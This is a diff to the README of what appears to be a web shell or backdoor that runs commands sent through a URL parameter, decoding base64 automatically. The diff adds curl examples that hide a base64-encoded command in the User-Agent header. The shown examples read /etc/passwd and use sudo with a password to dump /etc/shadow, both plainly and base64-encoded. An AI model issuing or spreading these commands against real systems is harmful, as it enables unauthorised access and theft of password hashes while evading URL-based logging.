@@ -22,8 +22,10 @@ It automaticaly detects and decode base64_encoded payloads.
 Somes examples:
 * http://host:port/?e=cat%20/etc/passwd
 * http://host:port/?e=Y2F0IC9ldGMvcGFzc3dk (the same but base64_encoded)
+* Using cURL: `curl http://host:port -A Y2F0IC9ldGMvcGFzc3dk`
 * http://host:port/?e=echo%20password%20|%20sudo%20-S%20cat%20/etc/shadow
 * http://host:port/?e=ZWNobyBwYXNzd29yZCB8IHN1ZG8gLVMgY2F0IC9ldGMvc2hhZG93 (the same but base64_encoded)
+* Using cURL: `curl http://host:port -A ZWNobyBwYXNzd29yZCB8IHN1ZG8gLVMgY2F0IC9ldGMvc2hhZG93`
 
 
 ## Credits
